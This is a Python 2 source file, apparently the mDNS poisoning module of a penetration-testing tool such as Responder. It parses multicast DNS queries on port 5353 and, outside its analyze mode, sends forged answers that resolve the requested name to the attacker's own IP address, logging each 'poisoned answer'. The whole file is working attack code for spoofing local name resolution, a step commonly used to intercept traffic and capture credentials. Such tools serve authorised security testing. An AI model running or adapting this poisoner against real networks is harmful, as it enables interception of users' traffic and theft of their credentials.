import struct
import settings
import socket

from SocketServer import BaseRequestHandler
from packets import MDNS_Ans
from utils import *

def Parse_MDNS_Name(data):
	data = data[12:]
	NameLen = struct.unpack('>B',data[0])[0]
	Name = data[1:1+NameLen]
	NameLen_ = struct.unpack('>B',data[1+NameLen])[0]
	Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
	return Name+'.'+Name_

def Poisoned_MDNS_Name(data):
	data = data[12:]
	Name = data[:len(data)-5]
	return Name

class MDNS(BaseRequestHandler):

	def handle(self):

		MADDR = "224.0.0.251"
		MPORT = 5353

		data, soc = self.request
		Request_Name = Parse_MDNS_Name(data)

		# Break out if we don't want to respond to this host
		if RespondToThisHost(self.client_address[0], Request_Name) is not True:
			return None

		try:
			# Analyze
			if settings.Config.AnalyzeMode:
				if Parse_IPV6_Addr(data):
					print text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0], 3, 0), color(Request_Name, 3, 0)))

			else:
				# Send poisoned packet
				if Parse_IPV6_Addr(data):
					
					Poisoned_Name = Poisoned_MDNS_Name(data)
					Buffer = MDNS_Ans(AnswerName = Poisoned_Name, IP=socket.inet_aton(settings.Config.Responder_IP))
					Buffer.calculate()
					soc.sendto(str(Buffer), (MADDR, MPORT))
					
					print color('[MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1)

		except Exception:
			raise